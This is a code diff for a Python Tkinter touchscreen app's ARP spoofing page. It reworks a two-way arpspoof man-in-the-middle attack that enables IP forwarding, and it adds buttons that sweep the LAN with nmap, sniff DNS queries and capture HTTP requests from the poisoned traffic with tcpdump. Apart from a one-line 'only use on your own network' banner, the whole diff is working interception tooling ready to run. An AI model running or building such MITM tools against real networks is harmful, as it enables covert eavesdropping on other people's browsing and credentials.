@@ -1897,12 +1897,15 @@ class ChronometerPage(tk.Frame):
         self.laps_area.config(state=tk.DISABLED)
 
 class ArpSpoofPage(tk.Frame):
-    """ARP Spoofing (Man-in-the-Middle) — sadece kendi ağınızda!"""
+    """ARP Spoofing (MITM) — sadece kendi ağınızda!"""
     def __init__(self, parent, controller):
         tk.Frame.__init__(self, parent, bg="black", width=480, height=320)
         self.controller = controller
         self.processes = []
         self.running = False
+        self._focus = "target"
+        self.target_ip = ""
+        self.gateway_ip = ""
 
         # --- Toolbar ---
         tb = tk.Frame(self, bg="#111111"); tb.place(x=0, y=0, width=480, height=30)
@@ -1911,79 +1914,59 @@ class ArpSpoofPage(tk.Frame):
                   command=self.smart_back).pack(side="left", fill="y")
         tk.Label(tb, text="ARP SPOOFING", bg="#111111", fg="#aa0000",
                  font=("Helvetica",11,"bold")).pack(side="left", expand=True)
+        self.btn_start_top = tk.Button(tb, text="START", bg="#005500", fg="white",
+                                        font=("Helvetica",10,"bold"), bd=0,
+                                        command=self.start_spoof)
+        self.btn_start_top.pack(side="right", fill="y", padx=(4,4))
 
-        # --- Input Frame ---
+        # --- INPUT MODE ---
         self.input_frame = tk.Frame(self, bg="black")
+        self._build_input_ui()
 
-        tk.Label(self.input_frame, text="⚠ ONLY USE ON YOUR OWN NETWORK", bg="black",
-                 fg="#aa0000", font=("Helvetica",9,"bold")).place(relx=0.5, y=5, anchor="n")
+        # --- MITM MODE ---
+        self.mitm_frame = tk.Frame(self, bg="black")
+        self._build_mitm_ui()
 
-        tk.Label(self.input_frame, text="TARGET IP:", bg="black", fg="#39ff14",
-                 font=("Helvetica",10,"bold")).place(x=10, y=30)
-        self.target_entry = tk.Entry(self.input_frame, font=("Helvetica",14),
-                                      bg="#222", fg="white", bd=2, relief="solid",
-                                      insertbackground="#39ff14")
-        self.target_entry.place(x=10, y=50, width=460, height=30)
+    # ============================================================
+    # INPUT MODE
+    # ============================================================
+    def _build_input_ui(self):
+        f = self.input_frame
 
-        tk.Label(self.input_frame, text="GATEWAY IP:", bg="black", fg="#39ff14",
-                 font=("Helvetica",10,"bold")).place(x=10, y=85)
-        self.gateway_entry = tk.Entry(self.input_frame, font=("Helvetica",14),
-                                       bg="#222", fg="white", bd=2, relief="solid",
-                                       insertbackground="#39ff14")
-        self.gateway_entry.place(x=10, y=105, width=460, height=30)
+        tk.Label(f, text="⚠ ONLY USE ON YOUR OWN NETWORK", bg="black",
+                 fg="#aa0000", font=("Helvetica",8,"bold")).place(x=0, y=5, width=480)
 
-        # Otomatik gateway algılama
-        tk.Button(self.input_frame, text="AUTO-DETECT GATEWAY", bg="#333", fg="#39ff14",
-                  font=("Helvetica",10,"bold"), command=self.detect_gateway
-                  ).place(x=10, y=140, width=225, height=28)
-        tk.Button(self.input_frame, text="CLEAR", bg="#333", fg="white",
-                  font=("Helvetica",10,"bold"),
-                  command=lambda: (self.target_entry.delete(0, tk.END),
-                                   self.gateway_entry.delete(0, tk.END))
-                  ).place(x=245, y=140, width=225, height=28)
+        tk.Label(f, text="TARGET IP:", bg="black", fg="#39ff14",
+                 font=("Helvetica",9,"bold"), anchor="w").place(x=10, y=28, width=460)
+        self.target_entry = tk.Entry(f, font=("Helvetica",14), bg="#222", fg="white",
+                                      bd=2, relief="solid", insertbackground="#39ff14")
+        self.target_entry.place(x=10, y=45, width=460, height=28)
 
-        # Basit numeric keypad
-        self.kb_target = tk.StringVar(value="target")
-        self._build_keypad(self.input_frame, y_start=175)
+        tk.Label(f, text="GATEWAY IP:", bg="black", fg="#39ff14",
+                 font=("Helvetica",9,"bold"), anchor="w").place(x=10, y=80, width=460)
+        self.gateway_entry = tk.Entry(f, font=("Helvetica",14), bg="#222", fg="white",
+                                       bd=2, relief="solid", insertbackground="#39ff14")
+        self.gateway_entry.place(x=10, y=97, width=460, height=28)
 
-        # START butonu
-        tk.Button(self.input_frame, text="START SPOOFING", font=("Helvetica",13,"bold"),
-                  bg="#aa0000", fg="white", command=self.start_spoof
-                  ).place(x=0, y=285, width=480, height=25)
+        tk.Button(f, text="AUTO-DETECT", bg="#333", fg="#39ff14",
+                  font=("Helvetica",9,"bold"), bd=1, relief="solid",
+                  highlightbackground="#39ff14",
+                  command=self.detect_gateway).place(x=10, y=132, width=225, height=22)
+        tk.Button(f, text="CLEAR", bg="#333", fg="white",
+                  font=("Helvetica",9,"bold"), bd=1, relief="solid",
+                  command=self._clear_inputs).place(x=245, y=132, width=225, height=22)
 
-        # --- Log Frame ---
-        self.log_frame = tk.Frame(self, bg="black")
-        sb = tk.Scrollbar(self.log_frame); sb.pack(side="right", fill="y")
-        self.log_area = tk.Text(self.log_frame, bg="black", fg="#39ff14",
-                                font=("Helvetica",10), bd=0, padx=5, pady=5,
-                                yscrollcommand=sb.set, state=tk.DISABLED)
-        self.log_area.pack(side="left", fill="both", expand=True)
-        sb.config(command=self.log_area.yview)
-        make_readonly_text(self.log_area)
+        self.btn_focus_target = tk.Button(f, text="→ TARGET", bg="#005500", fg="white",
+                                            font=("Helvetica",9,"bold"), bd=0,
+                                            command=lambda: self._set_focus("target"))
+        self.btn_focus_target.place(x=10, y=160, width=225, height=22)
+        self.btn_focus_gateway = tk.Button(f, text="→ GATEWAY", bg="#333", fg="#39ff14",
+                                             font=("Helvetica",9,"bold"), bd=0,
+                                             command=lambda: self._set_focus("gateway"))
+        self.btn_focus_gateway.place(x=245, y=160, width=225, height=22)
 
-        # STOP butonu (log ekranındayken)
-        self.btn_stop = tk.Button(self, text="STOP SPOOFING", font=("Helvetica",13,"bold"),
-                                   bg="#aa0000", fg="white", command=self.stop_spoof)
-
-    def _build_keypad(self, parent, y_start):
-        """Sadece IP girişi için basit keypad."""
-        active = self._active_entry()  # target veya gateway
-
-        # Target/Gateway seçici
-        sel = tk.Frame(parent, bg="black")
-        sel.place(x=10, y=y_start-25, width=460, height=22)
-        self.btn_sel_target = tk.Button(sel, text="→ TARGET", font=("Helvetica",8,"bold"),
-                                         bg="#005500", fg="white", bd=0,
-                                         command=lambda: self._set_focus("target"))
-        self.btn_sel_target.pack(side="left", fill="both", expand=True, padx=1)
-        self.btn_sel_gateway = tk.Button(sel, text="→ GATEWAY", font=("Helvetica",8,"bold"),
-                                          bg="#333", fg="#39ff14", bd=0,
-                                          command=lambda: self._set_focus("gateway"))
-        self.btn_sel_gateway.pack(side="left", fill="both", expand=True, padx=1)
-
-        # Rakamlar
-        rows = [["1","2","3"],["4","5","6"],["7","8","9"],[".","0","⌫"]]
-        for r, row in enumerate(rows):
+        keys = [["1","2","3"],["4","5","6"],["7","8","9"],[".","0","⌫"]]
+        for r, row in enumerate(keys):
             for c, ch in enumerate(row):
                 if ch == "⌫":
                     cmd = self._del_char
@@ -1991,55 +1974,109 @@ class ArpSpoofPage(tk.Frame):
                 else:
                     cmd = lambda x=ch: self._add_char(x)
                     bg = "#222"
-                tk.Button(parent, text=ch, command=cmd, bg=bg, fg="#39ff14",
-                          font=("Helvetica",11,"bold"), bd=1, relief="solid",
+                tk.Button(f, text=ch, command=cmd, bg=bg, fg="#39ff14",
+                          font=("Helvetica",12,"bold"), bd=1, relief="solid",
                           highlightbackground="#39ff14"
-                          ).place(x=10 + c*153, y=y_start + r*25, width=153, height=24)
+                          ).place(x=10 + c*153, y=190 + r*26, width=153, height=24)
 
-    def _active_entry(self):
-        return self._focus if hasattr(self, '_focus') else None
+    # ============================================================
+    # MITM MODE
+    # ============================================================
+    def _build_mitm_ui(self):
+        f = self.mitm_frame
 
-    def _set_focus(self, which):
-        self._focus = which
-        if which == "target":
-            self.btn_sel_target.config(bg="#005500", fg="white")
-            self.btn_sel_gateway.config(bg="#333", fg="#39ff14")
-        else:
-            self.btn_sel_target.config(bg="#333", fg="#39ff14")
-            self.btn_sel_gateway.config(bg="#005500", fg="white")
+        self.status_lbl = tk.Label(f, text="● MITM ACTIVE", bg="#aa0000", fg="white",
+                                     font=("Helvetica",10,"bold"))
+        self.status_lbl.place(x=0, y=0, width=480, height=22)
 
-    def _add_char(self, ch):
-        if not hasattr(self, '_focus'): self._focus = "target"
-        entry = self.target_entry if self._focus == "target" else self.gateway_entry
-        entry.insert(tk.END, ch)
+        self.info_lbl = tk.Label(f, text="", bg="#111111", fg="#cc8800",
+                                   font=("Helvetica",8), anchor="w")
+        self.info_lbl.place(x=0, y=22, width=480, height=18)
 
-    def _del_char(self):
-        if not hasattr(self, '_focus'): self._focus = "target"
-        entry = self.target_entry if self._focus == "target" else self.gateway_entry
-        cur = entry.get()
-        if cur: entry.delete(len(cur)-1, tk.END)
+        log_f = tk.Frame(f, bg="black")
+        log_f.place(x=0, y=40, width=480, height=180)
+        sb = tk.Scrollbar(log_f); sb.pack(side="right", fill="y")
+        self.log_area = tk.Text(log_f, bg="black", fg="#39ff14",
+                                font=("Helvetica",9), bd=0, padx=4, pady=3,
+                                yscrollcommand=sb.set, state=tk.DISABLED, wrap="word")
+        self.log_area.pack(side="left", fill="both", expand=True)
+        sb.config(command=self.log_area.yview)
+        make_readonly_text(self.log_area)
+        self.log_area.tag_config("sys", foreground="#888888")
+        self.log_area.tag_config("ok", foreground="#39ff14")
+        self.log_area.tag_config("warn", foreground="#cc8800")
+        self.log_area.tag_config("err", foreground="#aa0000")
+        self.log_area.tag_config("data", foreground="#00bfff")
 
+        bf1 = tk.Frame(f, bg="black"); bf1.place(x=0, y=225, width=480, height=30)
+        tk.Button(bf1, text="SCAN HOSTS", bg="#1a1a1a", fg="#39ff14",
+                  font=("Helvetica",10,"bold"), bd=1, relief="solid",
+                  highlightbackground="#39ff14",
+                  command=self.scan_hosts).place(x=5, y=1, width=230, height=28)
+        tk.Button(bf1, text="DNS SPY", bg="#1a1a1a", fg="#39ff14",
+                  font=("Helvetica",10,"bold"), bd=1, relief="solid",
+                  highlightbackground="#39ff14",
+                  command=self.dns_spy).place(x=245, y=1, width=230, height=28)
+
+        bf2 = tk.Frame(f, bg="black"); bf2.place(x=0, y=258, width=480, height=30)
+        tk.Button(bf2, text="HTTP CAPTURE", bg="#1a1a1a", fg="#39ff14",
+                  font=("Helvetica",10,"bold"), bd=1, relief="solid",
+                  highlightbackground="#39ff14",
+                  command=self.http_capture).place(x=5, y=1, width=230, height=28)
+        tk.Button(bf2, text="STOP MITM", bg="#aa0000", fg="white",
+                  font=("Helvetica",10,"bold"), bd=1, relief="solid",
+                  highlightbackground="#aa0000",
+                  command=self.stop_spoof).place(x=245, y=1, width=230, height=28)
+
+    # ============================================================
+    # Layout helpers
+    # ============================================================
     def on_show(self):
         self.show_input()
 
     def show_input(self):
-        self.log_frame.place_forget()
-        self.btn_stop.place_forget()
+        self.mitm_frame.place_forget()
         self.input_frame.place(x=0, y=30, width=480, height=290)
+        self.btn_start_top.config(state=tk.NORMAL, text="START", bg="#005500")
 
-    def show_log(self):
+    def show_mitm(self):
         self.input_frame.place_forget()
-        self.log_frame.place(x=0, y=30, width=480, height=260)
-        self.btn_stop.place(x=0, y=290, width=480, height=30)
+        self.mitm_frame.place(x=0, y=30, width=480, height=290)
+        self.btn_start_top.config(state=tk.DISABLED, text="RUNNING", bg="#555555")
 
     def smart_back(self):
         if self.running:
             self.stop_spoof()
             return
-        if self.log_frame.place_info():
+        if self.mitm_frame.place_info():
             self.show_input()
         else:
             self.controller.go_back()
+
+    # ============================================================
+    # Input helpers
+    # ============================================================
+    def _set_focus(self, which):
+        self._focus = which
+        if which == "target":
+            self.btn_focus_target.config(bg="#005500", fg="white")
+            self.btn_focus_gateway.config(bg="#333", fg="#39ff14")
+        else:
+            self.btn_focus_target.config(bg="#333", fg="#39ff14")
+            self.btn_focus_gateway.config(bg="#005500", fg="white")
+
+    def _add_char(self, ch):
+        entry = self.target_entry if self._focus == "target" else self.gateway_entry
+        entry.insert(tk.END, ch)
+
+    def _del_char(self):
+        entry = self.target_entry if self._focus == "target" else self.gateway_entry
+        cur = entry.get()
+        if cur: entry.delete(len(cur)-1, tk.END)
+
+    def _clear_inputs(self):
+        self.target_entry.delete(0, tk.END)
+        self.gateway_entry.delete(0, tk.END)
 
     def detect_gateway(self):
         try:
@@ -2051,43 +2088,43 @@ class ArpSpoofPage(tk.Frame):
                 self.gateway_entry.insert(0, gw)
         except: pass
 
+    # ============================================================
+    # Start / Stop
+    # ============================================================
     def start_spoof(self):
         target = self.target_entry.get().strip()
         gateway = self.gateway_entry.get().strip()
         if not target or not gateway:
-            # Kısa uyarı
             self.target_entry.config(bg="#500000")
             self.gateway_entry.config(bg="#500000")
             self.after(600, lambda: (self.target_entry.config(bg="#222"),
                                      self.gateway_entry.config(bg="#222")))
             return
 
-        # arpspoof kurulu mu?
         if subprocess.run("which arpspoof", shell=True, capture_output=True).returncode != 0:
-            self.show_log()
-            self.log("[!] arpspoof bulunamadı")
-            self.log("[*] Kurulum: sudo apt install dsniff")
-            self.after(4000, self.show_input)
+            self.show_mitm()
+            self._clear_log()
+            self.log("[!] arpspoof not found", "err")
+            self.log("[*] Install: sudo apt install dsniff", "sys")
+            self.after(3000, self.show_input)
             return
 
         self.running = True
-        self.show_log()
-        self.log_area.config(state=tk.NORMAL)
-        self.log_area.delete(1.0, tk.END)
-        self.log_area.config(state=tk.DISABLED)
+        self.target_ip = target
+        self.gateway_ip = gateway
+        self.show_mitm()
+        self._clear_log()
+        self.info_lbl.config(text=f"TGT: {target}  |  GW: {gateway}")
 
-        self.log(f"[*] ARP Spoofing başlatılıyor")
-        self.log(f"[*] TARGET  : {target}")
-        self.log(f"[*] GATEWAY : {gateway}")
-        self.log("")
+        self.log("[*] Starting ARP poisoning...", "sys")
+        self.log(f"[*] Target:  {target}", "sys")
+        self.log(f"[*] Gateway: {gateway}", "sys")
 
-        # IP forwarding aç
         subprocess.run("sudo sysctl -w net.ipv4.ip_forward=1",
                        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        self.log("[+] IP forwarding: ON")
+        self.log("[+] IP forwarding ON", "ok")
 
         try:
-            # İki yönlü poison
             p1 = subprocess.Popen(
                 f"sudo arpspoof -i wlan0 -t {target} {gateway}",
                 shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
@@ -2099,10 +2136,9 @@ class ArpSpoofPage(tk.Frame):
                 text=True, bufsize=1, start_new_session=True
             )
             self.processes = [p1, p2]
-            self.log("[+] ARP poisoning AKTİF")
-            self.log("[*] Trafik MITM üzerinden akıyor")
-            self.log("[!] Durdurmak için STOP SPOOFING")
-            self.log("")
+            self.log("[+] ARP poisoning ACTIVE", "ok")
+            self.log("[*] Use buttons below to inspect traffic", "sys")
+            self.log("", "sys")
 
             def reader(proc, tag):
                 try:
@@ -2110,15 +2146,15 @@ class ArpSpoofPage(tk.Frame):
                     for line in proc.stdout:
                         if not self.running: break
                         line = line.strip()
-                        if line and line != last:  # aynı satırı tekrar tekrar gösterme
+                        if line and line != last:
                             last = line
-                            self.log(f"[{tag}] {line[:70]}")
+                            self.log(f"[{tag}] {line[:68]}", "data")
                 except: pass
 
             threading.Thread(target=reader, args=(p1, "T→G"), daemon=True).start()
             threading.Thread(target=reader, args=(p2, "G→T"), daemon=True).start()
         except Exception as e:
-            self.log(f"[!] Hata: {str(e)[:50]}")
+            self.log(f"[!] Error: {str(e)[:50]}", "err")
             self.stop_spoof()
 
     def stop_spoof(self):
@@ -2126,26 +2162,102 @@ class ArpSpoofPage(tk.Frame):
             self.show_input()
             return
         self.running = False
-        self.log("[!] Durduruluyor...")
+        self.log("[!] Stopping MITM...", "warn")
         for p in self.processes:
             try: os.killpg(os.getpgid(p.pid), signal.SIGINT)
             except: pass
         self.processes = []
         subprocess.run("sudo sysctl -w net.ipv4.ip_forward=0",
                        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        self.log("[-] IP forwarding: OFF")
-        self.log("[-] ARP tablosu 30-60 sn içinde eski haline dönecek")
+        self.log("[-] IP forwarding OFF", "sys")
+        self.log("[-] ARP tables recover in 30-60s", "warn")
         self.after(2000, self.show_input)
 
-    def log(self, m):
+    # ============================================================
+    # MITM action buttons
+    # ============================================================
+    def scan_hosts(self):
+        self.log("", "sys")
+        self.log("[*] Scanning LAN hosts...", "sys")
+        def run():
+            try:
+                r = subprocess.run("ip -o -f inet addr show wlan0 | awk '{print $4}'",
+                                  shell=True, capture_output=True, text=True, timeout=3)
+                subnet = r.stdout.strip()
+                if not subnet:
+                    self.after(0, lambda: self.log("[!] Cannot get subnet", "err"))
+                    return
+                self.after(0, lambda: self.log(f"[*] Subnet: {subnet}", "sys"))
+                r = subprocess.run(f"sudo nmap -sn -PR {subnet}",
+                                  shell=True, capture_output=True, text=True, timeout=60)
+                hosts = []
+                for line in r.stdout.splitlines():
+                    if "Nmap scan report for" in line:
+                        hosts.append(line.replace("Nmap scan report for ", "").strip())
+                if not hosts:
+                    self.after(0, lambda: self.log("  (no hosts found)", "warn"))
+                else:
+                    self.after(0, lambda: self.log(f"[+] {len(hosts)} host(s):", "ok"))
+                    for h in hosts:
+                        self.after(0, lambda l=h: self.log(f"  {l[:76]}", "data"))
+            except Exception as e:
+                self.after(0, lambda: self.log(f"[!] Scan failed: {str(e)[:40]}", "err"))
+        threading.Thread(target=run, daemon=True).start()
+
+    def dns_spy(self):
+        self.log("", "sys")
+        self.log("[*] Capturing DNS queries (10s)...", "sys")
+        def run():
+            try:
+                r = subprocess.run(
+                    "sudo timeout 10 tcpdump -i wlan0 -n 'udp port 53' -l 2>/dev/null | head -25",
+                    shell=True, capture_output=True, text=True, timeout=15
+                )
+                lines = [l.strip() for l in r.stdout.splitlines() if l.strip()]
+                if not lines:
+                    self.after(0, lambda: self.log("  (no DNS traffic)", "warn"))
+                for line in lines:
+                    self.after(0, lambda l=line: self.log(f"  {l[:78]}", "data"))
+            except Exception as e:
+                self.after(0, lambda: self.log(f"[!] DNS spy failed: {str(e)[:40]}", "err"))
+        threading.Thread(target=run, daemon=True).start()
+
+    def http_capture(self):
+        self.log("", "sys")
+        self.log("[*] Capturing HTTP (10s)...", "sys")
+        def run():
+            try:
+                r = subprocess.run(
+                    "sudo timeout 10 tcpdump -i wlan0 -n -A 'tcp port 80' -l 2>/dev/null "
+                    "| grep -aE '^(GET|POST|Host:)' | head -20",
+                    shell=True, capture_output=True, text=True, timeout=15
+                )
+                lines = [l.strip() for l in r.stdout.splitlines() if l.strip()]
+                if not lines:
+                    self.after(0, lambda: self.log("  (no HTTP traffic)", "warn"))
+                for line in lines:
+                    self.after(0, lambda l=line: self.log(f"  {l[:78]}", "data"))
+            except Exception as e:
+                self.after(0, lambda: self.log(f"[!] HTTP capture failed: {str(e)[:40]}", "err"))
+        threading.Thread(target=run, daemon=True).start()
+
+    # ============================================================
+    # Log helpers
+    # ============================================================
+    def _clear_log(self):
+        self.log_area.config(state=tk.NORMAL)
+        self.log_area.delete(1.0, tk.END)
+        self.log_area.config(state=tk.DISABLED)
+
+    def log(self, m, tag="sys"):
         def _l():
             self.log_area.config(state=tk.NORMAL)
-            self.log_area.insert(tk.END, m + "\n")
+            self.log_area.insert(tk.END, m + "\n", tag)
             log_sinirla(self.log_area)
             self.log_area.see(tk.END)
             self.log_area.config(state=tk.DISABLED)
         self.after(0, _l)
-
+        
 class MainMenu(tk.Frame):
     APPS = [
         ("OnionShare Chat", "OnionPage"), ("File Receive", "ReceivePage"),
